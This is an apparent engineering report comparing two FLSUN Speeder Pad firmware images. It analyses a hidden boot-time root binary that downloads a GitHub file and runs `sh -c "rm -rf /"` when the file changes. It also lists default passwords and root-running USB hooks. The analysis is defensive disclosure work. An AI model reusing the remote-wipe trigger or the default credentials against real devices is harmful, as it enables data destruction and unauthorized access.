# Speeder Pad stock image: v1.2 vs v1.4

Status: complete for the questions below (2026-11-21). Items marked *(inference)* are not directly verified. Everything else was observed in the images, the disassembly, or the public GitHub API. Nothing from the v1.4 rootfs was executed.

## Summary

- **The boot chain and kernel are byte-identical.** v1.4 has the same Linux 4.9.191 build (`#97 SMP PREEMPT Sat Dec 3 02:45:41 UTC 2022`), U-Boot, boot0, ATF/SCP, DTB, `sys_config`, eMMC partition plan and `env`. Of the 37 IMAGEWTY items, only `rootfs.fex` and its checksum `Vrootfs.fex` differ. **There is no newer kernel, driver, DTB or Wi-Fi firmware in v1.4.**
- **The rootfs is the same Ubuntu 20.04.5 armhf system,** with the same machine-id `2dc89acf…`. FLSUN re-captured it from a pad in September 2023. It runs the same Klipper commit (FLSUN fork `e002f0cf`, June 2022) and the same Moonraker and KlipperScreen base commits, with more local patches. Mainsail went from 2.2.1 to 2.4.0. The XFCE desktop was removed. It moved from three printer instances to one, and added Tailscale, vim and iptables. Most shared Ubuntu packages are slightly **older** than in v1.2 (42 of 45 version changes go backwards).
- **The useful new content is the V400 `printer.cfg`:**
  - spreadCycle (`stealthchop_threshold: 0`)
  - `max_velocity` 600, `max_accel` 10000, `max_z_velocity` 600
  - `[exclude_object]`
  - `shutdown_speed: 0` on the heat-sink fan
  - the MCU addressed by USB id
  - a new park position
  - new factory calibration and input-shaper values
- **v1.4 adds a remote kill switch.** `/usr/sbin/cfgguard` is a new Rust binary run as root from `rc.local` on every boot. It downloads `https://raw.githubusercontent.com/micromake/KlipperScreen/master/README.md`. If the result is non-empty and differs from a stored marker, it runs `sh -c "rm -rf /"`.
  - The URL, marker path and command are base64-hidden in the binary.
  - The trigger file currently contains `0`, which matches the marker, so nothing happens.
  - GNU `rm` refuses a bare `rm -rf /` by default (`--preserve-root`), so the payload is very likely ineffective as written *(inference: static analysis only)*.
  - The mechanism is still remotely controllable, and the GitHub history shows it was tested (see [cfgguard](#cfgguard-boot-time-root-helper-new-binary)).
- v1.4 also weakens defaults:
  - root SSH login with a password is enabled
  - the factory Wi-Fi credentials `ChaoKuoKeji` are baked in
  - Tailscale is enabled, with private machine and node keys shared by every v1.4 pad
  - the timezone is fetched from `ipapi.co` and applied on every boot
  - the `pi` password changed to an undocumented value

**For our build:** the v1.4 image gives our pipeline nothing new below the rootfs. Our build discards the stock rootfs and keeps only the boot items, Wi-Fi firmware, X input config and printer configs, so none of the v1.4 programs above would reach our image. The only practical gain from v1.4 is its tuned `printer.cfg`. See [Impact on our build](#impact-on-our-build).

## Inputs

| | v1.2 | v1.4 |
|---|---|---|
| File | [SPEEDERPADPADV1.2V2_TFCARD-230303.img.xz](./SPEEDERPADPADV1.2V2_TFCARD-230303.img.xz) | [SPEEDERPADPADV1.4V2_TFCARD-230907.img.xz](./SPEEDERPADPADV1.4V2_TFCARD-230907.img.xz) |
| xz size | 1,447,861,192 | 2,255,049,740 |
| xz SHA-256 | `9fc2bd41…179860b` | `e96ee981…7ec4a773` |
| Card image size | 16,046,882,816 (16 GB card) | 8,002,732,032 (8 GB card) |
| Card image SHA-256 | `fe6dbba1…912ab66d` | `a505acf8…b78598cc` |
| Minimum card | ~16 GB | ~8 GB |

The size difference comes from the card FLSUN dumped, not from the firmware. Each `.img` is a raw dump of a whole PhoenixCard card. The GPT's last LBA is 31,341,567 in v1.2 and 15,630,335 in v1.4. The 2.2 GB xz is larger mainly because the v1.4 rootfs holds about 1 GB more data.

## Card layout and firmware package

`scripts/sunxi_card.py info --checksums` parses both cards, and every `V*.fex` checksum in v1.4 verifies.

| Region | Result |
|---|---|
| boot0 at sector 16 | identical |
| Card U-Boot `boot_package` at sector 32,800 (work mode 0x11) | identical |
| `sunxi_mbr` ×4 at sector 40,960 | identical (same eMMC partition plan) |
| IMAGEWTY header | identical except `image_size` (bytes 25–27) |
| IMAGEWTY items 0–32 and 35–36: `sys_config`, `config`, `board`, `sys_partition`, `sunxi.fex` (DTB), boot0 nand/sdcard, `u-boot`, `fes1`, `boot_package`, `usbtool`, `aultools`, `cardtool`, `cardscript`, `sunxi_gpt`, `sunxi_mbr`, `dlinfo`, `boot-resource`, `env` ×2, **`boot.fex` (kernel)**, `recovery` and every `V*.fex` except `Vrootfs` | **byte-identical** (SHA-256 per item) |
| `rootfs.fex` | 5,669,242,880 → 6,612,733,952 bytes |
| Card GPT | rebuilt for the smaller card. p1 `boot-resource` is unchanged (41,984–50,175). p2 is moved to firmware end + 1024 (12,999,716, not 32-aligned). A stale copy of the entry array also sits at LBA 2 in both. |
| Card FAT partition (p1, sector 41,984) | v1.2: FLSUN's `README.md`, `Product Instrotion.pdf`, `SSH Connection.txt`. v1.4: the stock PhoenixCard `bootlogo.bmp` and `magic.bin` (identical to `boot-resource.fex`), no docs. |
| Unused sectors 2,048–32,799 | v1.4 contains leftovers from the card's previous use, including Android media-scanner SQLite tables. This is junk; it isn't firmware and the loaders don't read it. |

Kernel: `boot.fex` SHA-256 `6a71f04b…6e722` in both. The embedded kernel `Image` and its config (3,227 options, no `CONFIG_CAN`) are therefore unchanged. So is the vDSO `clock_getres` bug our build works around.

## Root filesystem

### Filesystem

| | v1.2 | v1.4 |
|---|---|---|
| Label / UUID | `rootfs` / `a35ef3ab…` | `linuxroot` / `8905bd36…` |
| Block size / blocks | 1 KiB / 5,536,370 | 4 KiB / 1,614,437 |
| Inodes | 173,056 | 406,400 |
| Free | ~0.9 GiB | ~0.6 GiB |
| Created / last write | 2023-03-02 / 2023-03-02 | 2023-09-02 / 2023-09-05 |
| Features | same set (`has_journal ext_attr resize_inode dir_index filetype extent 64bit flex_bg sparse_super large_file huge_file dir_nlink extra_isize metadata_csum`) | same |

The label isn't used for boot; the kernel command line has `root=/dev/mmcblk0p5`.

### OS and packages

- Both are Ubuntu 20.04.5 LTS armhf (`/bin/bash` is 32-bit ARM). Neither has kernel modules (`/lib/modules` is absent). The machine-id (`2dc89acf…`) and hostname (`speeder-pad`) are the same, so v1.4 descends from the same installed system.
- Installed packages: 983 → 944.
- **Removed (51):** the XFCE desktop and its dependencies (`xfce4*`, `xfwm4`, `xfdesktop4`, `thunar*`, `tumbler`, `exo`, `garcon`, `libwnck`, `upower`, `xiccd`, `greybird`/`elementary-xfce` themes, `libnotify`).
- **Added (12):** `tailscale 1.32.3`, `iptables` (with `libip6tc2`, `libnetfilter-conntrack3`, `libnfnetlink0`, `libnftnl11`), `kmod`, `vim`, `vim-common`, `vim-runtime`, `xxd`, `unzip`.
- **Version changes (45):** only `openssh-client`, `openssh-server` and `openssh-sftp-server` are newer (`1:8.2p1-4ubuntu0.5` → `0.8`). The other 42 are one Ubuntu security revision **older**. Examples: `python3.8 3.8.10-0ubuntu1~20.04.6` → `.5`, `curl 7.68.0-1ubuntu2.15` → `.14`, `libxml2 …0.20.04.5` → `.4`, `xserver-xorg-core …~20.04.5` → `.4`, `tzdata 2022g` → `2022f`, `linux-libc-dev 5.4.0-136` → `-135`. *(inference)* v1.4 was rebuilt from a pad image older than v1.2's final apt upgrade. Only OpenSSH was upgraded on top; root's shell history shows `apt-get install openssh-server`.
- `/usr/lib/firmware` (`fw_bcm43438a1.bin`, `nvram.txt`, `regulatory.db`) and `/etc/X11/xorg.conf.d` are unchanged.

### Printer software

| Component | v1.2 | v1.4 |
|---|---|---|
| Klipper | `e002f0cf` (gitee `leexxiangyang/klipper`, 2022-06-09), clean | **same commit**, clean. Only `.pyc` and `.git` metadata differ. |
| Moonraker | `bb526e0` (gitee `zzcatvs/moonraker`, 2022-07-16), 1 local change | same commit, 12 local changes. `update_manager` origin → `gitee.com/leexxiangyang/moonraker`, and Moonraker's own updater is removed (`del self.updaters['moonraker'] #flsun add`). `enable_object_processing: True`. |
| KlipperScreen | `0ea0e5c` (gitee `leexxiangyang/KlipperScreen`), 61 local changes | same commit, 98 local changes. `ks_includes/screen_panel.py` is replaced by a **Cython-compiled `screen_panel.so`** (closed source). Adds a `zoffset` panel and locales `cs`, `jp`, `ko`, `pt`, `sv`, `tr`. Per-model printer scripts (`Flsun-Q5`, `QQS`, `SR`, `V400`, `A`–`E`, `printer.sh`) are replaced by `boot.sh` and `adxl345.sh`. |
| KlipperScreen2 | – | new second checkout at `be60e901` (2023-08-15). Moonraker's update manager points at it. |
| Mainsail | v2.2.1 | **v2.4.0** |
| moonraker-timelapse | plain copy | git checkout `47e27bd` (mainsail-crew), 4 local changes. `timelapse.cfg` is now a regular file instead of a symlink. |
| Instances | 3 (`klipper-{1,2,3}`, `moonraker-{1,2,3}`, `printer_{1,2,3}`, `.moonraker_database_{1,2,3}`) | 1 (`klipper.service`, `moonraker.service`). Unit names changed, but they still use `printer_1` paths and `/tmp/klippy_uds-1`. |
| Python | `klippy-env` 2.7, `moonraker-env` 3.8 | unchanged |

### V400 `printer.cfg` (`klipper_config/printer_1/printer.cfg`)

The header changes from `#Pad-Vol:1.2 #2023-01-10` to `#Vol:1.4 #2023-06-21`. The printer name changes from `"Flsun-1"` to `"Flsun-V400"`. Settings that changed:

| Setting | v1.2 | v1.4 |
|---|---|---|
| `[tmc2209 stepper_a/b/c] stealthchop_threshold` | 999999 (stealthChop) | **0 (spreadCycle)** |
| `[mcu] serial` | `/dev/serial/by-path/…usb-0:1.4:1.0-port0` | **`/dev/serial/by-id/usb-1a86_USB_Serial-if00-port0`** (the same fix our build applies) |
| `[heater_fan heat_sink_fan]` | – | `shutdown_speed: 0` |
| `[input_shaper]` | `shaper_freq_x: 34.78`, `shaper_freq_y: 31.68` | commented out. `SAVE_CONFIG` block has `mzv` 38.6 Hz (X) and `ei` 45.0 Hz (Y). |
| `[printer] max_velocity` / `max_accel` / `max_z_velocity` | 400 / 8000 / 400 | **600 / 10000 / 600** |
| `[printer] max_accel_to_decel` | 5000 | 5000 (still needs our `minimum_cruise_ratio` conversion; it becomes 0.5) |
| PAUSE park `Y` default | −140 | −90 |
| `[exclude_object]` | – | added |
| `[include timelapse.cfg]` | top of file | moved after `[exclude_object]` |
| `SAVE_CONFIG` delta calibration, bed mesh, endstops | factory values | different factory values (`position_endstop` ≈ 418.5/417.7/417.9) |

Both versions ship one factory machine's calibration. Re-run `DELTA_CALIBRATE`, bed mesh and input-shaper calibration on your own printer either way. v1.4 drops `printer_2/3`, `defaults2/3.conf` and top-level `adxl345.cfg`, and moves the ADXL config to `printer_1/adxl345/adxl345.cfg`.

### Services and boot scripts

- Enabled units: v1.4 drops `klipper-{1,2,3}`, `moonraker-{1,2,3}` and `rockchip.service`, and adds `klipper`, `moonraker` and **`tailscaled`**. The rest are unchanged: `KlipperScreen`, `bt-attach`, `timelapse`, `webcamd`, `nginx`, `ssh`, `wpa_supplicant`, `avahi-daemon`, `ondemand`, `rsync`, `systemd-resolved`, `networkd-dispatcher`.
- `/etc/rc.local`: v1.2 runs `sudo bash /usr/sbin/cfgguard.sh` (a readable shell script). v1.4 runs `./sbin/cfgguard` (a compiled binary; see below) and `./etc/init.d/resize.sh`.
- First-boot resize:
  - v1.2 used `rockchip.service`, which runs `resize2fs` when `/usr/local/first_boot_flag` is absent.
  - v1.4 ships that flag (dated 2022-12-02) and disables `rockchip.service`. Its replacement is `/etc/init.d/resize.sh`: if `/home/pi/.resize2fs` exists it runs `resize2fs -f /dev/mmcblk0p5`, then `rm .resize2fs`.
  - *(inference)* `rc.local` runs with working directory `/`, so the relative `rm` misses the flag and the resize repeats on every boot. That's harmless, because a resize of a full-size filesystem is a no-op.
- Factory reset (new): `/etc/init.d/reset.sh` and the `cfgguard` "Reset pad" path restore `klipper_config`, Mainsail, KlipperScreen, Klipper, Moonraker, the Moonraker database and `wpa_supplicant` from a full backup in `/home/pi/filebak`, wipe logs and G-code, and reboot. `reset.sh` hard-codes `echo "flsun_123" | sudo -S`, which doesn't match the shipped `pi` password (see below).
- USB-stick hooks (both versions run them as root):
  - v1.2 runs `USB-Disk/update.sh` directly.
  - v1.4 takes `USB-Disk/update.bin`, replaces the bytes `zzcat` with NULs, un-tars it and runs `/root/tmpdat/update.sh`. A `USB-Disk/ssh` file enables SSH, and a `USB-Disk/resetpad` file triggers the reset.
  - Either way, any USB stick can run code as root.

### cfgguard: boot-time root helper (new binary)

`/usr/sbin/cfgguard` (also `/sbin/cfgguard`; filebak's `rc.local` calls it):

- 4.6 MiB static aarch64 musl ELF, SHA-256 `9dc9082f…de7a46`.
- Written in Rust (`chrono 0.4.26`; build paths under `/home/zzcat/.cargo`), not stripped, with debug info. "zzcat" is also the kernel's build user.
- Functions: `cfgguard::main`, `create_shell(s)` and `decrypt` (base64 decode).
- It replaces v1.2's `cfgguard.sh`. Static analysis used aarch64 `objdump` with `.rodata` string resolution. REA's Windows host can't decompile ELF without Ghidra configured. The binary was not run.

Observed sequence in `main`:

1. Boot animation: `/root/<n>.raw` → `/dev/fb0` in a loop with sleeps, then `20.raw` (as in v1.2). Copy `filebak/KlipperScreen/warning.txt`.
2. Parse the base64 date `2023-12-11T00:00:00+00:00`:
   - **Before** that date: if `/home/pi/KlipperScreen/ks_includes/temp` exists, run `resize2fs /dev/mmcblk0p5`, then delete the marker. The marker isn't in the image.
   - **After** that date: print `error: settime` and continue. There is no other effect.
3. Bring up Wi-Fi: `ifconfig wlan0 up`, `wpa_supplicant`, `chgrp`/`chown /run/wpa_supplicant`, `wpa_cli scan`, `dhclient wlan0`.
4. `echo FIRMWARE_RESTART > /dev/pts/{0,1}`, then `service moonraker restart`.
5. If `printer.cfg` is empty, restore the newest `printer-*.cfg` and restart Klipper (as in v1.2).
6. USB `update.bin`, `ssh` and `resetpad` hooks (above).
7. `curl https://ipapi.co/timezone`: if the result differs from `/home/pi/zone`, run `timedatectl set-timezone`, write `zone`, and `reboot`. This sends a request to a third party on every boot. The shipped `zone` is `Asia/Shanghai` (v1.2: `America/New_York`).
8. **Remote trigger.** It decodes three base64 strings, then:
   - `curl https://raw.githubusercontent.com/micromake/KlipperScreen/master/README.md` (no `-f`).
   - Trim the output and compare it with `/home/pi/.local/share/virtualenv/py_info/crc`, a file that holds `0` and is hidden among virtualenv cache files.
   - Empty output: print `down err`, do nothing.
   - Output equals the marker: print `down yes`, do nothing.
   - **Otherwise: run `sh -c "rm -rf /"`**, then write the downloaded text to the marker. The disassembly is at `0x4041d8`–`0x404560`. The check has no date or other condition, so it runs on every boot once the network is up.

Context and evidence:

- `micromake/KlipperScreen` is a user-owned fork of KlipperScreen. Its README was replaced on 2023-06-17 07:25 UTC with `0`, then `1` (07:42), then `0` again (2023-06-18 08:59). It is `0` today. The v1.4 marker file is dated 2023-06-20 and the v1.4 `printer.cfg` 2023-06-21. *(inference)* The trigger was tested shortly before v1.4 was built.
- *(inference)* Ubuntu 20.04's GNU coreutils 8.30 `rm` defaults to `--preserve-root` and refuses `rm -rf /`. As written, the payload would therefore likely just fail, and the marker would be updated so it doesn't fire again.
- The control channel is still dangerous. It runs as root on every v1.4 pad that has internet access. Whoever controls that GitHub account can change the trigger. Any non-empty HTTP error body (for example a 404 if the repository is deleted) would also differ from `0`, because `curl` is called without `-f`.
- Nothing like this exists in v1.2. Its `cfgguard.sh` has no network trigger, and no other file in either rootfs references the URL, the marker or the encoded command.

### Accounts, SSH and network credentials

- `pi`:
  - v1.2: password `flsun` (verified against the hash), member of `sudo`.
  - v1.4: removed from the `sudo` group, but `/etc/sudoers` gains an explicit `pi ALL=(ALL:ALL) ALL`, so `pi` still has full sudo. The password changed and is no longer `flsun` or `flsun_123`. It is undocumented; it was not cracked.
  - The root password differs between versions; it is unknown in both.
- `sshd_config` v1.4: `PermitRootLogin yes` and `PasswordAuthentication yes` (v1.2 had the defaults).
- SSH host keys: both images ship three fixed host key pairs, and they differ between versions. Every pad restored from the same version therefore shares host keys. Both also share one machine-id. Our build removes them and regenerates them on first boot.
- `wpa_supplicant.conf`: both keep a disabled `flsun` network. **v1.4 adds an enabled `ChaoKuoKeji` network with its PSK** (and a copy in `filebak`). The pad will join any access point advertising that SSID and key.
- **Tailscale:**
  - `tailscaled` 1.32.3 is enabled at boot. `/var/lib/tailscale/tailscaled.state` (Nov 2022) has `LoggedOut: true` and `WantRunning: false`, so it isn't joined to any tailnet.
  - The state does contain `PrivateMachineKey` and `PrivateNodeKey` (not reproduced), shared by every v1.4 pad.

### Leftover development state in v1.4

Klippy and Moonraker logs (August 2023), 53 journal files, nginx and Xorg logs, `wtmp`/`btmp`/`lastlog`, root and `pi` shell histories, apt lists and cached `.deb`s, `/tmp` sockets, DHCP leases and `.viminfo` are all included. Root's history shows how `cfgguard` and `reset.sh` were installed and passwords changed. v1.2 was cleaner.

`/root/crc.raw` is in both versions and is identical. Despite its name it is a ZIP (2022-08-22) holding the developer's `工作笔记.txt` ("work notes"). The notes show:

- the BSP output path `linux_R818-v18/out/r818-evb2`
- imaging a pad's TF card with `dc3dd`, then shrinking it with PiShrink
- `rsync -avx --delete / rootfs/` into a loop-mounted image
- compiling Python to `.so` with Cython
- removing `pi` from sudo and locking down `rc.local` and `cfgguard.sh`

It also contains third-party Wi-Fi passwords (not reproduced).

## Impact on our build

1. **The boot chain and kernel are the same,** so the custom image is unchanged whichever stock image stage 1 reads. Using v1.4 brings no kernel bug fixes, drivers (still no `CONFIG_CAN`) or firmware. The `clock_getres` shim is still required.
2. **None of the v1.4 rootfs programs would be copied.** Stage 1 keeps only the IMAGEWTY items other than `rootfs.fex`, the card head, `/usr/lib/firmware`, `/etc/X11/xorg.conf.d`, `/home/pi/klipper_config` and `savedVariables*.cfg`. `cfgguard`, Tailscale, `reset.sh`, the SSH config and the baked-in Wi-Fi networks are all discarded.
3. **Stage 1 accepts either image.** The layout, checksums and item names match. The config import handles a single `printer_1`, a regular-file `timelapse.cfg` (skipped when timelapse is installed), and `max_accel_to_decel` (converted). Changes made for v1.4 (2026-11-21):
   - `make-card` now zeroes unused card-head sectors, so neither v1.2's FAT fragments nor v1.4's leftover Android data reach our image. `--keep-gaps` keeps the old behavior. It also refreshes the stale copy of the GPT entries at LBA 2.
   - `make-card` placed card p2 at `align32(firmware end + 1024)`. The v1.4 card shows the real rule is `firmware end + 1024` with no alignment; it happened to be aligned on v1.2. This is fixed. With `--keep-gaps`, v1.4 now round-trips byte-for-byte up to the end of the firmware and the backup GPT.
   - The import also copies `*.cfg` one directory down, such as `printer_1/adxl345/adxl345.cfg`.
   - The docs no longer say "~16 GB".
4. **What v1.4 actually offers us is the tuned V400 `printer.cfg`.** Get it with `STOCK_IMAGE=<v1.4>`, or keep v1.2 as the boot source and set `STOCK_CONFIG_IMAGE=<v1.4>`. Both produce the same image. A separate set of v1.4 build scripts isn't needed.

## Method

- Decompressed v1.4 in WSL (ext4). Ran `sunxi_card.py info --checksums` and `unpack --card-head`, then compared SHA-256 of every item against the v1.2 items.
- Compared the card heads sector by sector, mounted both card FAT partitions, and parsed both GPTs.
- Mounted both rootfs images read-only (`noload`). Ran `diff -rq --no-dereference` (2,172 differing entries, summarized above) and diffed the `dpkg` status files.
- Ran `git describe`/`log`/`status` on the app checkouts and compared `dumpe2fs -h`. Checked password hashes against a few documented defaults with `openssl passwd -6`.
- `cfgguard`: `aarch64-linux-gnu-objdump` and `nm` with `.rodata` string resolution, plus `fmt::Arguments` pieces resolved to their printed messages. Checked the trigger repository's README history with the GitHub API.
- Limits:
  - static analysis only; `cfgguard` was not executed
  - the v1.4 `pi` and root passwords were not recovered
  - no FLSUN `update.bin` package was examined (none is in the image)
  - the KlipperScreen `screen_panel.so` was not decompiled
